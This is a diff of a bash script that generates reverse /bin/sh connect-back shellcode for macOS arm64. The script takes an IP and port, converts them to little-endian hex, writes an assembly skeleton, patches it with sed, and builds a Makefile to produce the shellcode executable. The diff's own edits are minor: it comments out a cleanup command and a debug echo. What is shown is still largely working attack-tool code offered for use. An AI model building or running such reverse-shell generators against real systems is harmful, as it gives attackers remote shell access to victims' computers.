@@ -18,7 +18,7 @@ echo -e "What Port Number are we connecting to? : \c"
 read port
 
 # Cleanup 
-rm shellcode.exe shellcode.o shellcode.s Makefile 
+# rm shellcode.exe shellcode.o shellcode.s Makefile 
 
 # Working with the IP variable 
 IFS=. read ip1 ip2 ip3 ip4 <<< "$IP"
@@ -33,7 +33,7 @@ hexport="$(printf '%02X\n' $port)"
 # Flipping to Little Endian the hexport value 
 v=$hexport 
 flippedport="$(echo ${v:6:2}${v:4:2}${v:2:2}${v:0:2})"
-echo $flippedport 
+#echo $flippedport 
 
 # Dumping the reverse /bin/sh connect back  shellcode skeleton 
 cat <<EOF > shellcode.s 
@@ -100,6 +100,7 @@ sed  "s/FFF3/$subst2/g" shellcode2.s > shellcode.s
 rm -f shellcode2.s 
 
 echo "Finally building object and executable shellcode"
+echo ""
 echo 'LDFLAGS=-lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path` -arch arm64' > Makefile
 echo '' >> Makefile
 echo '%.o: %.s'>> Makefile 
